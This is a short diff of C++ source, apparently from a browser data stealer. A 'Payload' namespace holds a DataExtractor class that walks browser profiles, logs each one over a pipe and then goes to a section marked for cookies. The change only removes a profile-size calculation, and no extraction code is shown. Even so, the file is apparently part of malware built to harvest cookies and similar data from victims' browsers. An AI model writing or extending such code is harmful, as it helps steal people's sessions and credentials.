@@ -77,14 +77,6 @@ namespace Payload {
 
     void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
         m_pipe.Log("PROFILE:" + profilePath.filename().string());
-        
-        try {
-            uintmax_t size = 0;
-            for(const auto& p : std::filesystem::recursive_directory_iterator(profilePath)) {
-                if(!std::filesystem::is_directory(p)) size += std::filesystem::file_size(p);
-            }
-            m_pipe.LogData("Size", std::to_string(size / 1024 / 1024) + " MB");
-        } catch(...) {}
 
         try {
             // Cookies
